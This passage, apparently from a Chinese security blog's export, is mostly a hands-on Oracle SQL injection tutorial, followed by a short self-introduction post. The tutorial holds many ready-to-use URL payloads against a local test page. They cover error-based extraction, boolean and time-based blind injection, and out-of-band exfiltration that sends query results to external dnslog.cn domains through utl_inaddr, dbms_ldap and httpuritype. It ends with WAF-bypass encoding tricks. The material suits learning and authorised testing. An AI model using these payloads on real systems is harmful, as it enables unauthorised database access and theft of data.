查询当前用户：http://127.0.0.1/oracle.php?id=1&#39; and 1=ctxsys.drithsx.sn(1, (select user from dual))-- ctxsys.ctx_report.token_type()：处理文本的函数，参数错误时会报错。 用法： 1and 1=ctxsys.ctx_report.token_type((sql语句),1)-- 查询当前用户：http://127.0.0.1/oracle.php?id=1&#39; and 1=ctxsys.ctx_report.token_type((select user from dual),1)-- XMLType:环境原因，未能实现。 用法： 123and (select upper(XMLType(chr(60)||chr(58)||(select user from dual(sql语句))||chr(62))) from dual) is not null --select xmltype(&#x27;&lt;:&#x27;||(select user from dual)||&#x27;&gt;&#x27;) from dual XMLType在使用这个XMLType进行报错时，很多人不知道为什么要用chr(60)，通过ascii查询可以看到，60:&lt;,58:’:’,62:’&gt;’,查了下相关的api，发现xmltype在进行解析的时候必须以&lt;开头&gt;结尾，这里:冒号在这是必不可少的，另外需要注意的是如果返回的数据种有空格的话，它会自动截断，导致数据不完整，这种情况下先转为 hex，再导出。注意url编码 dbms_xdb_version.checkin(): 此函数检入已签出的VCR，并返回新创建版本的资源ID， 用法DBMS_XDB_VERSION.CHECKIN( pathname VARCHAR2) RETURN DBMS_XDB.resid_type; 如果路径名不存在，则会引发异常，返回路径名（pathname） 这里的pathname传入的sql语句，所以报错返回的pathname结果为sql执行的结果值。 用法： 1and (select dbms_xdb_version.checkin((sql语句)) from dual) is not null 查询当前用户：http://127.0.0.1/oracle.php?id=1&#39; and (select dbms_xdb_version.checkin((select user from dual)) from dual) is not null-- dbms_xdb_version.makeversioned(): 如果资源不存在，则会引发异。 用法原理与上面的一样： 1and (select dbms_xdb_version.makeversioned((sql语句)) from dual) is not null -- 查询当前用户：http://127.0.0.1/oracle.php?id=1&#39;and (select dbms_xdb_version.makeversioned((select user from dual)) from dual) is not null -- dbms_xdb_version.uncheckout(): 用法原理与上面的一样： 1and (select dbms_xdb_version.uncheckout((sql语句l)) from dual) is not null -- 查询用户：http://127.0.0.1/oracle.php?id=1&#39; and (select dbms_xdb_version.uncheckout((select user from dual)) from dual) is not null -- dbms_utility.sqlid_to_sqlhash(): 原理未清楚 用法： 1and (SELECT dbms_utility.sqlid_to_sqlhash((sql语句)) from dual) is not null -- 查询用户：http://127.0.0.1/oracle.php?id=1&#39; and (SELECT dbms_utility.sqlid_to_sqlhash((select user from dual)) from dual) is not null -- ordsys.ord_dicom.getmappingxpath(): 环境原因未能实现 用法： 1and 1=ordsys.ord_dicom.getmappingxpath((sql语句),user,user)--， 后面的两个user可有可无，也可以是任意值 例如：and 1=ordsys.ord_dicom.getmappingxpath((select user from dual))– decode(): 这种方式更偏向布尔型注入，因为这种方式并不会通过报错把查询结果回显回来，仅是用来作为页面的表现不同的判断方法。 例如当substr(user,1,1)=‘S’页面报错，其他情况页面无报错也不会显示数据，这说明user的第一个字符为S。 用法：decode(条件,值1,返回值1,值2,返回值2,…值n,返回值n,缺省值)， 1and 1=(select decode(substr(user,1,1),&#x27;S&#x27;,(1/0),0) from dual) -- 代码decode(substr(user,1,1),’S’,(1/0),0)中,substr(user,1,1)=’S’时，就返回(1/0)的值，但是0不能为分母，所以报错！ 查询当前用户名： 判断第一位：http://127.0.0.1/oracle.php?id=1‘’ and 1=(select decode(substr(user,1,1),&#39;S&#39;,(1/0),0) from dual) --，这里页面报错，说明user第一位字符为S http://127.0.0.1/oracle.php?id=1&#39; and 1=(select decode(substr(user,1,1),&#39;T&#39;,(1/0),0) from dual) --，这里不报错说明第一位不是T： 判断第二位：http://127.0.0.1/oracle.php?id=1&#39; and 1=(select decode(substr(user,2,1),&#39;Y&#39;,(1/0),0) from dual) --：为Y 以此类推。 Instr函数: 也是通过页面的来判断查询的结果是否正确，正确返回正常，不正确返回错误： 用法：and 1=instr((sql语句),’猜测要查询的结果’)– 1and 1=instr((select user from dual),&#x27;SYSTEM&#x27;)-- 判断当前用户：http://127.0.0.1/oracle.php?id=1&#39; and 1=(instr((select user from dual),&#39;SYSTEM(要大写)&#39;))--，返回正确页面说明是system用户， 也可以逐个字符去判断，只要有一个字符不正确就会返回错误页面，例如： http://127.0.0.1/oracle.php?id=1&#39; and 1=(instr((select user from dual),&#39;St&#39;))-- http://127.0.0.1/oracle.php?id=1&#39; and 1=(instr((select user from dual),&#39;SY&#39;))-- 布尔盲注盲注可以使用ASCII()，substr()这种通用组合获取数 使用length()函数判断长度，使用ascii()和substr()函数猜解数据， length用法： 1and length((sql语句))=长度-- 判断用户名长度：http://127.0.0.1/oracle.php?id=1&#39; and length((select user from dual))=6-- ascii()和substr()函数猜解数据 用法： 1and ascii(substr((sql语句),1,1))=ascii码值 -- 逐个拆解用户名：http://127.0.0.1/oracle.php?id=1&#39; and ascii(substr((select user from dual),1,1))=83 -- 也可以用直接用substr函数：http://127.0.0.1/oracle.php?id=1&#39; and (select substr(user,1,1)from dual)=&#39;S&#39; -- 注意大小写 延时注入在Oracle延时注入利用过程中需要使用DECODE、DBMS_PIPE.RECEIVE_MESSAGE等函数来延时数据库的处理时间，当然也可以是case，if 等方式。最后测试者可以通过网页的加载时间来判断注入结果。 DECODE函数的使用方法此处不再讨论。 这里主要利用了oracle管道功能接收消息的函数RECEIVE_MESSAGE，实现延时注入。 DBMS_PIPE.RECEIVE_MESSAGE(‘任意值’,延迟时间) DBMS_PIPE.RECEIVE_MESSAGE(‘RDS’,5)表示从RDS管道返回的数据需要等待5秒，一般情况下可以以PUBLIC权限使用该函数。 判断是否有延时注入：http://127.0.0.1/oracle.php?id=1&#39; and 1= dbms_pipe.receive_message(&#39;RDS&#39;, 10)-- 后续步骤需要使用DECODE函数： DECODE(condition,value,dbms_pipe.receive_message(‘RDS’, 5),0)，意思是当condition=value就返回dbms_pipe.receive_message(‘RDS’, 5)，那么页面就等待5秒时间，从而达到延时注入的目的。 判断用户名：http://127.0.0.1/oracle.php?id=1&#39; and 1=(select decode(substr(user,1,1),&#39;S&#39;,dbms_pipe.receive_message(&#39;RDS&#39;,5),0) from dual)-- 也可以：http://127.0.0.1/oracle.php?id=1&#39; and 1=dbms_pipe.receive_message(&#39;aaa&#39;,(decode((select user from dual),&#39;SYSTEM&#39;,3)))-- 如果判断不是就报错： 也可以：http://127.0.0.1/oracle.php?id=1&#39; and 1=DBMS_PIPE.RECEIVE_MESSAGE(&#39;pyy&#39;, REPLACE((SELECT substr(user, 1, 1) FROM dual), &#39;S&#39;, 10))-- 后续步骤参考前面的步骤即可。 也可以用高耗时操作：例如：(select count(*) from all_objects)：对数据库中大量数据进行查询或其他处理的操作，这样的操作会耗费较多的时间，然后通过这个方式来获取数据。这种方式也适用于其他数据库。 结合decode猜解用户名：http://127.0.0.1/oracle.php?id=1&#39; and 1=(select decode(substr(user,1,1),&#39;S&#39;,(select count(*) from all_objects),0) from dual)--正确： http://127.0.0.1/oracle.php?id=1&#39; and 1=(select decode(substr(user,1,1),&#39;a&#39;,(select count(*) from all_objects),0) from dual)--错误： 带外攻击OOBOracle的带外注入和DNSLOG很相似，需要使用网络请求的函数进行注入利用，其中可以进行网络请求的函数有UTL_HTTP.REQUEST、UTL_INADDR.GET_HOST_ADDRESS、SYS.DBMS_LDAP.INIT、httpuritype()等。 一般使用 Oracle 发送HTTP或者DNS请求，将查询结果带到请求中，然后监测外网服务器的HTTP和DNS日志，从日志中获取 sql 语句查询的结果，通过这种方式将繁琐的盲注转换成可以直接简便的获取查询结果的方式，尤其是基于时间的盲注，能极大地加快速度 两种思路： 第一种：使用Oracle发送HTTP请求，相关函数：utl_http.request()，需要自己搭建外网web服务器，并记录请求的日志信息，然后使用utl_http.request()向外网主机发送http请求，请求便携带了查询的结果信息。此处可以结合SSRF进行内网探测 ，或许这就是Oracle的ssrf。 第二种（DNSlog）：使用Oracle发送DNS请求，相关函数：utl_inaddr.get_host_address()、utl_inaddr.get_host_name()，将查询结果拼接到域名下，并使用DNS记录解析日志。 理解：这两种方式应该对Oracle的版本有要求，应该与utl_inaddr.get_host_name()函数要求一致，11g之后需要网络访问权限。 utl_http.request() :步骤：首先检测函数是否能用，其中函数返回值是请求的返回值。 http://127.0.0.1/oracle.php?id=1&#39; and exists (select count(*) from all_objects where object_name=&#39;UTL_HTTP&#39;) --，页面返回正常说明该函数可以使用。 使用方法： 1and utl_http.request(&#x27;http://域名或者ip:端口/&#x27;||(注入的sql语句))=1 -- 其中||放在URL中的时候需要URL编码。切记！！！ 准备监听的主机和端口： 发送请求（获取当前用户名）： 我这里测试没有成功，报错ORA-00904: : invalid identifier，可能是版本问题。 utl_inaddr.get_host_address 用法： 1234and utl_inaddr.get_host_address((sql语句)||&#x27;.dnslog的域名&#x27;)=1 -- 这个页面会报错或者and (select utl_inaddr.get_host_address((sql语句)||&#x27;.dnslog的域名&#x27;) from dual)is not null-- 这个页面不会报错 查询用户：http://127.0.0.1/oracle.php?id=1&#39; and utl_inaddr.get_host_address((select user from dual)||&#39;.x72v9n.dnslog.cn&#39;)=1 -- 页面会报错，但是dnslog成功接收到请求： http://127.0.0.1/oracle.php?id=1&#39;and (select utl_inaddr.get_host_address((select user from dual)||&#39;.mqzr75.dnslog.cn&#39;) from dual)is not null-- 这个页面不会报错，dnslog成功接收请求 sys.dbms_ldap.init()函数 DBMS_LDAP软件包使您可以从LDAP服务器访问数据。 FUNCTIONN INIT(): init()用LDAP服务器初始化会话。这实际上建立了与LDAP服务器的连接。语法:FUNCTION init(hostname IN VARCHAR2,portnum IN PLS_INTEGER)RETURN SESSION; 用法： 1and (select dbms_ldap.init((sql语句)||&#x27;.dnslog的域名&#x27;,80) from dual)is not null-- 查询用户：http://127.0.0.1/oracle.php?id=1&#39;and (select dbms_ldap.init((select user from dual)%7c%7c&#39;.b6kogu.dnslog.cn&#39;,80) from dual)is not null-- 页面会报错，dnslog成功接收请求： httpuritype()函数: 可以创建UriType列，并在其中存储DBURITYPE，XDBURITYPE或HTTPURITYPE的实例。您还可以定义自己的UriType子类型来处理不同的URL协议。 用法： 1and (select httpuritype((sql语句)||&#x27;.dnslog的域名&#x27;).getclob() from dual)is not null-- 查询当前用户：http://127.0.0.1/oracle.php?id=1&#39;and (select httpuritype((select user from dual)%7c%7c&#39;.ayh5v3.dnslog.cn&#39;).getclob() from dual)is not null-- 页面会报错，dnslog成功接收请求 Oracle绕过技巧使用hextoraw()及asciistr()搭配UTL_RAW.CAST_TO_VARCHAR2()函数来进行ascii的编码 hextoraw()：十六进制字符串转换为rawSELECT UTL_RAW.CAST_TO_VARCHAR2(hextoraw(“abcdef”)) FROM dual使用rawtohex()来进行ascii的解码 SELECT rawtohex(‘abcdef’) FROM dual下面是一些利用编码绕过的情况 SELECT 1 FROM dual; 正常语句SELECT%0a1%0aFROM%0adual; \\n换行来替代空格SELECT%0b1%0bFROM%0bdual; 使用tab来替换空格SELECT%0c1%0cFROM%0cdual; 使用\\r回车开替换空格SELECT//1//FROM//dual; 多行注释符来替代回车SELECT–%0a1–%0aFROM–%0adual; 单行注释符和换行来替代回车SELECT/!12321SELECT*/1/*!12321AND/FROM/!12321QWE/dual; 使用内联注释符 借用了在MySQL中bypass常用的技巧来做了简单的可行性测试，注释符和换行的搭配使用。 注释符拼接垃圾字符配合换行SQL&gt; select – asdnaso/asdas/ 2 user from–ioasndoiand 3 dual;USERSQLI: 利用waf的通用性特点SQL&gt; select user/!saho/from dual;USER/!SAHO/SQLISQL&gt; 调用函数是可使用空格换行等select ctxsys. drithsx.sn(user,’aa’)from dual; 命令执行未完待续","categories":[{"name":"web安全","slug":"web安全","permalink":"http://example.com/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"http://example.com/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"web安全","slug":"web安全","permalink":"http://example.com/tags/web%E5%AE%89%E5%85%A8/"},{"name":"技术","slug":"技术","permalink":"http://example.com/tags/%E6%8A%80%E6%9C%AF/"}]},{"title":"初次见面","slug":"初次见面","date":"2021-06-21T16:00:00.000Z","updated":"2021-06-25T05:15:32.999Z","comments":false,"path":"2021/06/22/初次见面/","link":"","permalink":"http://example.com/2021/06/22/%E5%88%9D%E6%AC%A1%E8%A7%81%E9%9D%A2/","excerpt":"大家好，初次见面，请多多指教。以后我都会在这里分享一些自己想要分享的东西，包括人和事以及一些技术文章还有乱七八糟的东西。我也会把这里当作是自己的另外一个内心世界，存放一些我的回忆。希望我能坚持写下去。做一个分享者，分享自己想分享的，这是多么美好的一件事啊。","text":"大家好，初次见面，请多多指教。以后我都会在这里分享一些自己想要分享的东西，包括人和事以及一些技术文章还有乱七八糟的东西。我也会把这里当作是自己的另外一个内心世界，存放一些我的回忆。希望我能坚持写下去。做一个分享者，分享自己想分享的，这是多么美好的一件事啊。 自我介绍本人是一名白帽子，目前再某安全公司上班。当然啦，我不是什么大神，我也只是一个半路出家的小白。平时喜欢web渗透，但是还有很多地方需要提高，请各位多多指教。","categories":[],"tags":[]}],"categories":[{"name":"web安全","slug":"web安全","permalink":"http://example.com/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"smb带外注入","slug":"smb带外注入","permalink":"http://example.com/tags/smb%E5%B8%A6%E5%A4%96%E6%B3%A8%E5%85%A5/"},{"name":"注入","slug":"注入","permalink":"http://example.com/tags/%E6%B3%A8%E5%85%A5/"},{"name":"mssql注入","slug":"mssql注入","permalink":"http://example.com/tags/mssql%E6%B3%A8%E5%85%A5/"},{"name":"sqlserver注入执行命令","slug":"sqlserver注入执行命令","permalink":"http://example.com/tags/sqlserver%E6%B3%A8%E5%85%A5%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4/"},{"name":"sql注入","slug":"sql注入","permalink":"http://example.com/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"web安全","slug":"web安全","permalink":"http://example.com/tags/web%E5%AE%89%E5%85%A8/"},{"name":"技术","slug":"技术","permalink":"http://example.com/tags/%E6%8A%80%E6%9C%AF/"}]}